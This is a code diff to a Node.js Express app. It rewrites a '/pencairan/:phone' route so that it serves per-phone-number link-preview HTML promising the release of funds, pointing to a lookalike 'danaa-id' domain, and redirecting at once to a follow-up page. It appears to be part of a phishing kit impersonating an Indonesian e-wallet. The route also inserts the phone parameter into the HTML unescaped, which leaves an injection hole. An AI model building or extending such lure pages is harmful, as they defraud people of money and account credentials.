@@ -445,9 +445,29 @@ app.get("/status/:phone", (req,res)=>{
 
 app.get("/pencairan/:phone", (req, res) => {
 
-    res.sendFile(
-        path.join(__dirname, "pencairan.html")
-    );
+    const phone = req.params.phone;
+
+    res.send(`
+<!DOCTYPE html>
+<html lang="id">
+<head>
+
+<meta charset="UTF-8">
+
+<title>PENCAIRAN ${phone}</title>
+
+<meta property="og:title" content="PENCAIRAN ${phone}">
+<meta property="og:description" content="Klik untuk melanjutkan proses pencairan dana Anda.">
+<meta property="og:image" content="https://danaa-id.dmpett-dgtall.xyz/assets/preview-pencairan.jpg">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://danaa-id.dmpett-dgtall.xyz/pencairan/${phone}">
+
+<meta http-equiv="refresh" content="0;url=/pencairan.html?phone=${phone}">
+
+</head>
+<body></body>
+</html>
+    `);
 
 });
 
